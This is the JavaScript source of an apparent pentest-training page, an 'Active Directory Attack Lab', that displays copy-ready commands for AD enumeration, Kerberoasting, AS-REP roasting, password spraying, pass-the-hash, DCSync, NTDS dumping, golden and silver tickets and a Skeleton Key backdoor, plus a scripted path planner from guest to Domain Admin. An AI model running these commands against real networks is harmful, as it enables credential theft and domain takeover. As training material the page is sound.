/* ==================== ACTIVE DIRECTORY ATTACK LAB 🏢👑 ==================== */
/* AD Enumeration, Exploitation & Persistence Techniques */

window.ADLab = {
    // --- STATE ---
    currentTab: 'enum',
    currentCategory: 'users',
    plannerState: {
        startNode: 'Guest',
        targetNode: 'Domain Admin',
        generatedPath: null
    },

    // --- ENUMERATION ---
    enumCommands: {
        users: [
            { name: 'Get All Users', cmd: 'Get-ADUser -Filter * -Properties *', tool: 'PowerShell' },
            { name: 'Get User Info', cmd: 'Get-ADUser -Identity username -Properties *', tool: 'PowerShell' },
            { name: 'LDAP Users', cmd: 'ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" "(objectClass=user)"', tool: 'Linux' },
            { name: 'Net Users', cmd: 'net user /domain', tool: 'CMD' },
            { name: 'Enum4linux', cmd: 'enum4linux -U 10.10.10.10', tool: 'Linux' }
        ],
        groups: [
            { name: 'All Groups', cmd: 'Get-ADGroup -Filter * | Select Name', tool: 'PowerShell' },
            { name: 'Domain Admins', cmd: 'Get-ADGroupMember -Identity "Domain Admins"', tool: 'PowerShell' },
            { name: 'Enterprise Admins', cmd: 'Get-ADGroupMember -Identity "Enterprise Admins"', tool: 'PowerShell' },
            { name: 'Net Groups', cmd: 'net group /domain', tool: 'CMD' },
            { name: 'Nested Groups', cmd: 'Get-ADGroupMember -Identity "GroupName" -Recursive', tool: 'PowerShell' }
        ],
        computers: [
            { name: 'All Computers', cmd: 'Get-ADComputer -Filter * -Properties *', tool: 'PowerShell' },
            { name: 'Domain Controllers', cmd: 'Get-ADDomainController -Filter *', tool: 'PowerShell' },
            { name: 'Net Computers', cmd: 'net view /domain', tool: 'CMD' },
            { name: 'Find DCs', cmd: 'nltest /dclist:domain.local', tool: 'CMD' }
        ],
        shares: [
            { name: 'Net View', cmd: 'net view \\\\server', tool: 'CMD' },
            { name: 'PowerView Shares', cmd: 'Find-DomainShare -CheckShareAccess', tool: 'PowerView' },
            { name: 'smbclient', cmd: 'smbclient -L //10.10.10.10 -U user', tool: 'Linux' },
            { name: 'CrackMapExec', cmd: 'crackmapexec smb 10.10.10.0/24 --shares', tool: 'Linux' }
        ],
        gpo: [
            { name: 'All GPOs', cmd: 'Get-GPO -All', tool: 'PowerShell' },
            { name: 'GPO Report', cmd: 'Get-GPOReport -All -ReportType HTML -Path gpo.html', tool: 'PowerShell' },
            { name: 'GPP Passwords', cmd: 'Get-GPPPassword', tool: 'PowerSploit' }
        ],
        acl: [
            { name: 'User ACLs', cmd: 'Get-DomainObjectAcl -Identity "user" -ResolveGUIDs', tool: 'PowerView' },
            { name: 'Find WriteDACL', cmd: 'Find-InterestingDomainAcl -ResolveGUIDs', tool: 'PowerView' },
            { name: 'BloodHound', cmd: 'SharpHound.exe -c All', tool: 'SharpHound' }
        ]
    },

    // --- ATTACKS ---
    attacks: {
        initial: [
            {
                name: 'AS-REP Roasting', desc: 'Get hash for users with no pre-auth',
                cmd: "GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'Kerberoasting', desc: 'Get TGS for service accounts',
                cmd: "GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request", tool: 'Impacket'
            },
            {
                name: 'Password Spray', desc: 'Try one password across many users',
                cmd: "crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'", tool: 'CME'
            },
            {
                name: 'LLMNR/NBT-NS', desc: 'Capture hashes via poisoning',
                cmd: 'responder -I eth0 -rdwv', tool: 'Responder'
            }
        ],
        lateral: [
            {
                name: 'Pass the Hash', desc: 'Use NTLM hash instead of password',
                cmd: "psexec.py domain/user@10.10.10.10 -hashes :NTLM_HASH", tool: 'Impacket'
            },
            {
                name: 'Pass the Ticket', desc: 'Use Kerberos ticket',
                cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi', tool: 'Rubeus'
            },
            {
                name: 'Overpass the Hash', desc: 'Convert NTLM to Kerberos TGT',
                cmd: 'sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:powershell', tool: 'Mimikatz'
            },
            {
                name: 'DCOM Exec', desc: 'Execute via DCOM',
                cmd: "dcomexec.py domain/user:pass@10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'WinRM', desc: 'Remote PowerShell',
                cmd: "evil-winrm -i 10.10.10.10 -u user -p pass", tool: 'Evil-WinRM'
            }
        ],
        privilege: [
            {
                name: 'DCSync', desc: 'Replicate DC to get all hashes',
                cmd: 'lsadump::dcsync /domain:domain.local /user:Administrator', tool: 'Mimikatz'
            },
            {
                name: 'Dump NTDS.dit', desc: 'Dump AD database',
                cmd: "secretsdump.py domain/user:pass@10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'Golden Ticket', desc: 'Forge TGT with KRBTGT hash',
                cmd: 'kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt', tool: 'Mimikatz'
            },
            {
                name: 'Silver Ticket', desc: 'Forge TGS for specific service',
                cmd: 'kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:server /service:cifs /rc4:HASH /ptt', tool: 'Mimikatz'
            },
            {
                name: 'Skeleton Key', desc: 'Backdoor DC authentication',
                cmd: 'misc::skeleton', tool: 'Mimikatz'
            }
        ],
        delegation: [
            {
                name: 'Unconstrained', desc: 'Dump tickets from memory',
                cmd: 'sekurlsa::tickets /export', tool: 'Mimikatz'
            },
            {
                name: 'Constrained S4U', desc: 'S4U2Self + S4U2Proxy',
                cmd: 'Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/server', tool: 'Rubeus'
            },
            {
                name: 'RBCD Attack', desc: 'Resource-based constrained delegation',
                cmd: 'Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$', tool: 'PowerShell'
            }
        ]
    },

    // --- TOOLS ---
    tools: [
        { name: 'BloodHound', desc: 'AD attack path visualization', link: 'https://github.com/BloodHoundAD/BloodHound' },
        { name: 'Impacket', desc: 'Python AD exploitation library', link: 'https://github.com/SecureAuthCorp/impacket' },
        { name: 'Mimikatz', desc: 'Windows credential extraction', link: 'https://github.com/gentilkiwi/mimikatz' },
        { name: 'Rubeus', desc: 'Kerberos abuse toolkit', link: 'https://github.com/GhostPack/Rubeus' },
        { name: 'PowerView', desc: 'AD enumeration module', link: 'https://github.com/PowerShellMafia/PowerSploit' },
        { name: 'CrackMapExec', desc: 'Swiss army knife for AD', link: 'https://github.com/byt3bl33d3r/CrackMapExec' },
        { name: 'Evil-WinRM', desc: 'WinRM shell for pentesting', link: 'https://github.com/Hackplayers/evil-winrm' },
        { name: 'Kerbrute', desc: 'Kerberos brute-force', link: 'https://github.com/ropnop/kerbrute' }
    ],

    // --- RENDER ---
    render() {
        return `
            <div class="ad-app fade-in">
                <div class="ad-header">
                    <h1><i class="fas fa-building"></i> Active Directory Attack Lab</h1>
                    <p class="subtitle">AD Enumeration, Exploitation & Persistence</p>
                </div>

                <div class="ad-tabs">
                    <div class="tab ${this.currentTab === 'enum' ? 'active' : ''}" onclick="ADLab.switchTab('enum')">
                        <i class="fas fa-search"></i> Enumeration
                    </div>
                    <div class="tab ${this.currentTab === 'attacks' ? 'active' : ''}" onclick="ADLab.switchTab('attacks')">
                        <i class="fas fa-skull-crossbones"></i> Attacks
                    </div>
                    <div class="tab ${this.currentTab === 'tools' ? 'active' : ''}" onclick="ADLab.switchTab('tools')">
                        <i class="fas fa-toolbox"></i> Tools
                    </div>
                    <div class="tab ${this.currentTab === 'planner' ? 'active' : ''}" onclick="ADLab.switchTab('planner')">
                        <i class="fas fa-brain"></i> AI Planner
                    </div>
                    <div class="tab ${this.currentTab === 'cheatsheet' ? 'active' : ''}" onclick="ADLab.switchTab('cheatsheet')">
                        <i class="fas fa-scroll"></i> Cheatsheet
                    </div>
                </div>

                <div class="ad-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'enum': return this.renderEnum();
            case 'attacks': return this.renderAttacks();
            case 'tools': return this.renderTools();
            case 'planner': return this.renderAIPlanner();
            case 'cheatsheet': return this.renderCheatsheet();
            default: return '';
        }
    },

    renderEnum() {
        const categories = Object.keys(this.enumCommands);
        const commands = this.enumCommands[this.currentCategory] || [];

        return `
            <div class="enum-section">
                <div class="category-nav">
                    ${categories.map(c => `
                        <button class="${this.currentCategory === c ? 'active' : ''}" onclick="ADLab.switchCategory('${c}')">
                            ${c.charAt(0).toUpperCase() + c.slice(1)}
                        </button>
                    `).join('')}
                </div>
                
                <div class="commands-grid">
                    ${commands.map(cmd => `
                        <div class="cmd-card">
                            <div class="cmd-header">
                                <span class="cmd-name">${cmd.name}</span>
                                <span class="cmd-tool">${cmd.tool}</span>
                            </div>
                            <div class="cmd-box">
                                <code>${this.escapeHtml(cmd.cmd)}</code>
                                <button onclick="navigator.clipboard.writeText(\`${cmd.cmd.replace(/`/g, '\\`')}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderAttacks() {
        return `
            <div class="attacks-section">
                ${Object.entries(this.attacks).map(([phase, attacks]) => `
                    <div class="attack-phase">
                        <h3><i class="fas fa-crosshairs"></i> ${phase.charAt(0).toUpperCase() + phase.slice(1)} Access</h3>
                        <div class="attacks-grid">
                            ${attacks.map(a => `
                                <div class="attack-card">
                                    <div class="attack-header">
                                        <h4>${a.name}</h4>
                                        <span class="attack-tool">${a.tool}</span>
                                    </div>
                                    <p>${a.desc}</p>
                                    <div class="attack-cmd">
                                        <code>${this.escapeHtml(a.cmd)}</code>
                                        <button onclick="navigator.clipboard.writeText(\`${a.cmd.replace(/`/g, '\\`')}\`)"><i class="fas fa-copy"></i></button>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    },

    renderTools() {
        return `
            <div class="tools-section">
                <h2><i class="fas fa-toolbox"></i> AD Exploitation Toolkit</h2>
                <div class="tools-grid">
                    ${this.tools.map(t => `
                        <div class="tool-card">
                            <h4>${t.name}</h4>
                            <p>${t.desc}</p>
                            <a href="${t.link}" target="_blank"><i class="fas fa-external-link-alt"></i> GitHub</a>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderCheatsheet() {
        return `
            <div class="cheatsheet-section">
                <h2><i class="fas fa-scroll"></i> AD Attack Methodology</h2>
                
                <div class="methodology">
                    <div class="phase">
                        <div class="phase-num">1</div>
                        <div class="phase-content">
                            <h4>Reconnaissance</h4>
                            <ul>
                                <li>Identify domain name & DC</li>
                                <li>Enumerate users & groups</li>
                                <li>Find service accounts (SPNs)</li>
                                <li>Map trust relationships</li>
                            </ul>
                        </div>
                    </div>
                    <div class="phase">
                        <div class="phase-num">2</div>
                        <div class="phase-content">
                            <h4>Initial Access</h4>
                            <ul>
                                <li>AS-REP Roasting</li>
                                <li>Kerberoasting</li>
                                <li>Password Spraying</li>
                                <li>LLMNR/NBT-NS Poisoning</li>
                            </ul>
                        </div>
                    </div>
                    <div class="phase">
                        <div class="phase-num">3</div>
                        <div class="phase-content">
                            <h4>Lateral Movement</h4>
                            <ul>
                                <li>Pass the Hash/Ticket</li>
                                <li>Overpass the Hash</li>
                                <li>WinRM/PSRemoting</li>
                                <li>SMB/WMI/DCOM Exec</li>
                            </ul>
                        </div>
                    </div>
                    <div class="phase">
                        <div class="phase-num">4</div>
                        <div class="phase-content">
                            <h4>Privilege Escalation</h4>
                            <ul>
                                <li>DCSync attack</li>
                                <li>Delegation abuse</li>
                                <li>ACL exploitation</li>
                                <li>GPO abuse</li>
                            </ul>
                        </div>
                    </div>
                    <div class="phase">
                        <div class="phase-num">5</div>
                        <div class="phase-content">
                            <h4>Domain Dominance</h4>
                            <ul>
                                <li>Golden Ticket</li>
                                <li>Silver Ticket</li>
                                <li>Skeleton Key</li>
                                <li>AdminSDHolder abuse</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="quick-wins">
                    <h3><i class="fas fa-bolt"></i> Quick Wins</h3>
                    <div class="wins-grid">
                        <div class="win">Find AS-REP: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}</code></div>
                        <div class="win">Find SPNs: <code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"}</code></div>
                        <div class="win">Find Admins: <code>Get-ADGroupMember "Domain Admins" -Recursive</code></div>
                        <div class="win">Find DCs: <code>Get-ADDomainController -Filter *</code></div>
                    </div>
                </div>
            </div>
        `;
    },

    // === AI PLANNER ===
    renderAIPlanner() {
        const path = this.plannerState.generatedPath;
        return `
            <div class="ai-planner-section">
                <div class="planner-header">
                    <h2><i class="fas fa-project-diagram"></i> AI Attack Path Planner</h2>
                    <p>Simulate BloodHound analysis to find the shortest path to Domain Admin.</p>
                </div>

                <div class="planner-controls">
                    <div class="control-group">
                        <label>Current Access</label>
                        <select id="start-node" onchange="ADLab.plannerState.startNode = this.value">
                            <option value="Guest" ${this.plannerState.startNode === 'Guest' ? 'selected' : ''}>Unauthenticated (Guest)</option>
                            <option value="User" ${this.plannerState.startNode === 'User' ? 'selected' : ''}>Domain User</option>
                            <option value="LocalAdmin" ${this.plannerState.startNode === 'LocalAdmin' ? 'selected' : ''}>Local Admin</option>
                            <option value="ServiceAccount" ${this.plannerState.startNode === 'ServiceAccount' ? 'selected' : ''}>Service Account</option>
                        </select>
                    </div>
                    <div class="control-group">
                        <div class="arrow"><i class="fas fa-arrow-right"></i></div>
                    </div>
                    <div class="control-group">
                        <label>Target</label>
                        <select id="target-node" disabled>
                            <option>Domain Admin</option>
                        </select>
                    </div>
                    <button class="generate-btn" onclick="ADLab.generatePath()"><i class="fas fa-magic"></i> Generate Path</button>
                </div>

                ${path ? this.renderPath(path) : ''}
            </div>
        `;
    },

    renderPath(path) {
        return `
            <div class="attack-path-container">
                <h3><i class="fas fa-route"></i> Optimal Attack Path</h3>
                <div class="path-steps">
                    ${path.map((step, index) => `
                        <div class="path-step">
                            <div class="step-icon"><i class="fas ${step.icon}"></i></div>
                            <div class="step-content">
                                <h4>${index + 1}. ${step.title}</h4>
                                <p>${step.desc}</p>
                                <div class="step-cmd"><code>${step.cmd}</code></div>
                            </div>
                        </div>
                        ${index < path.length - 1 ? '<div class="path-connector"></div>' : ''}
                    `).join('')}
                </div>
                <div class="path-summary">
                    <span><i class="fas fa-clock"></i> Est. Time: High</span>
                    <span><i class="fas fa-user-secret"></i> OpSec: Medium</span>
                </div>
            </div>
        `;
    },

    generatePath() {
        const start = this.plannerState.startNode;
        let generated = [];

        if (start === 'Guest') {
            generated = [
                { icon: 'fa-search', title: 'AS-REP Roasting', desc: 'Identify users that do not require Pre-Auth.', cmd: 'GetNPUsers.py domain/' },
                { icon: 'fa-key', title: 'Crack Hash', desc: 'Crack the AS-REP hash to get a user password.', cmd: 'hashcat -m 18200 hash.txt rockyou.txt' },
                { icon: 'fa-user', title: 'Domain User Access', desc: 'Log in as the roasting victim.', cmd: 'evil-winrm -u victim -p password' }
            ];
            // Recursively add user steps
            generated.push(...this.getUserPath());
        } else if (start === 'User') {
            generated = this.getUserPath();
        } else if (start === 'LocalAdmin') {
            generated = [
                { icon: 'fa-memory', title: 'Dump LSASS', desc: 'Extract cached credentials or tickets from memory.', cmd: 'mimikatz "sekurlsa::logonpasswords"' },
                { icon: 'fa-ticket-alt', title: 'Pass the Hash/Ticket', desc: 'Use extracted creds to move laterally.', cmd: 'psexec.py domain/admin@target' }
            ];
            generated.push(...this.getUserPath().slice(1)); // Skip recon
        }

        // Finalize DA
        generated.push(
            { icon: 'fa-crown', title: 'DCSync (Domain Admin)', desc: 'Replicate secrets from the Domain Controller.', cmd: 'secretsdump.py domain/user@dc' }
        );

        this.plannerState.generatedPath = generated;
        this.reRender();
    },

    getUserPath() {
        return [
            { icon: 'fa-bug', title: 'Kerberoasting', desc: 'Request TGS for service accounts.', cmd: 'GetUserSPNs.py -request' },
            { icon: 'fa-server', title: 'Lateral Movement', desc: 'Access server where Domain Admin is logged in.', cmd: 'Find-LocalAdminAccess' },
            { icon: 'fa-user-shield', title: 'Token Impersonation', desc: 'Steal Domain Admin token.', cmd: 'Incognito: list_tokens -u' }
        ];
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    switchCategory(cat) {
        this.currentCategory = cat;
        this.reRender();
    },

    escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    },

    reRender() {
        const app = document.querySelector('.ad-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .ad-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .ad-header h1 { margin: 0; color: #3b82f6; font-size: 1.8rem; }
            .ad-header .subtitle { color: #888; margin: 5px 0 20px; }

            .ad-tabs { display: flex; gap: 5px; margin-bottom: 20px; }
            .tab { padding: 10px 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; color: #888; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #3b82f6; color: #fff; }

            .category-nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
            .category-nav button { padding: 8px 16px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 20px; color: #aaa; cursor: pointer; transition: 0.2s; }
            .category-nav button:hover { border-color: #3b82f6; color: #3b82f6; }
            .category-nav button.active { background: #3b82f6; color: #fff; border-color: #3b82f6; }

            .commands-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; }
            .cmd-card { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; }
            .cmd-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
            .cmd-name { color: #3b82f6; font-weight: bold; }
            .cmd-tool { background: rgba(59,130,246,0.2); color: #3b82f6; padding: 2px 10px; border-radius: 10px; font-size: 0.75rem; }
            .cmd-box { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 12px; border-radius: 8px; }
            .cmd-box code { flex: 1; color: #2ecc71; font-family: monospace; font-size: 0.85rem; word-break: break-all; }
            .cmd-box button { background: none; border: none; color: #666; cursor: pointer; }
            .cmd-box button:hover { color: #3b82f6; }

            .attack-phase { margin-bottom: 30px; }
            .attack-phase h3 { color: #e74c3c; margin: 0 0 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }
            .attacks-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; }
            .attack-card { background: rgba(0,0,0,0.3); padding: 18px; border-radius: 12px; }
            .attack-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
            .attack-header h4 { margin: 0; color: #fff; }
            .attack-tool { background: rgba(231,76,60,0.2); color: #e74c3c; padding: 2px 10px; border-radius: 10px; font-size: 0.75rem; }
            .attack-card > p { color: #888; margin: 0 0 12px; font-size: 0.9rem; }
            .attack-cmd { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 10px; border-radius: 8px; }
            .attack-cmd code { flex: 1; color: #2ecc71; font-size: 0.8rem; word-break: break-all; }
            .attack-cmd button { background: none; border: none; color: #666; cursor: pointer; }

            .tools-section h2 { color: #3b82f6; margin: 0 0 20px; }
            .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
            .tool-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .tool-card h4 { color: #fff; margin: 0 0 8px; }
            .tool-card p { color: #888; margin: 0 0 12px; font-size: 0.9rem; }
            .tool-card a { color: #3b82f6; text-decoration: none; font-size: 0.9rem; }
            .tool-card a:hover { text-decoration: underline; }

            .cheatsheet-section h2 { color: #3b82f6; margin: 0 0 25px; }
            .methodology { display: flex; flex-direction: column; gap: 20px; margin-bottom: 30px; }
            .phase { display: flex; gap: 20px; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; }
            .phase-num { width: 40px; height: 40px; background: #3b82f6; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0; }
            .phase-content h4 { color: #3b82f6; margin: 0 0 10px; }
            .phase-content ul { margin: 0; padding-left: 20px; color: #888; }
            .phase-content li { margin: 5px 0; }

            .quick-wins h3 { color: #ffd700; margin: 0 0 15px; }
            .wins-grid { display: flex; flex-direction: column; gap: 10px; }
            .win { background: rgba(0,0,0,0.3); padding: 12px 15px; border-radius: 8px; color: #aaa; }
            .win code { color: #2ecc71; margin-left: 10px; }

            @media (max-width: 800px) { .commands-grid, .attacks-grid { grid-template-columns: 1fr; } .phase { flex-direction: column; } }

            /* AI Planner Styles */
            .ai-planner-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; }
            .planner-header { text-align: center; margin-bottom: 30px; }
            .planner-header h2 { color: #8b5cf6; margin-bottom: 5px; }
            
            .planner-controls { display: flex; justify-content: center; align-items: flex-end; gap: 20px; background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; margin-bottom: 30px; flex-wrap: wrap; }
            .control-group { display: flex; flex-direction: column; gap: 8px; }
            .control-group label { color: #aaa; font-size: 0.9rem; }
            .control-group select { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px 15px; border-radius: 8px; font-size: 1rem; width: 220px; }
            .arrow i { font-size: 1.5rem; color: #555; margin-bottom: 10px; }
            
            .generate-btn { background: linear-gradient(135deg, #8b5cf6, #6366f1); border: none; color: #fff; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; height: 42px; display: flex; align-items: center; gap: 8px; }
            .generate-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(139,92,246,0.3); }

            .attack-path-container { max-width: 800px; margin: 0 auto; }
            .attack-path-container h3 { color: #ffff; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
            .path-step { display: flex; gap: 20px; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px; border-left: 4px solid #8b5cf6; position: relative; }
            .step-icon { width: 50px; height: 50px; background: rgba(139,92,246,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #8b5cf6; flex-shrink: 0; }
            .step-content h4 { margin: 0 0 5px; color: #fff; }
            .step-content p { margin: 0 0 10px; color: #aaa; font-size: 0.9rem; }
            .step-cmd { background: #000; padding: 8px 12px; border-radius: 6px; font-family: monospace; color: #2ecc71; font-size: 0.85rem; display: inline-block; }
            
            .path-connector { height: 30px; border-left: 2px dashed #555; margin-left: 45px; }

            .path-summary { display: flex; gap: 20px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #333; justify-content: center; color: #888; }
            .path-summary i { color: #8b5cf6; margin-right: 5px; }
        </style>`;
    }
};

function pageADLab() {
    return ADLab.render();
}
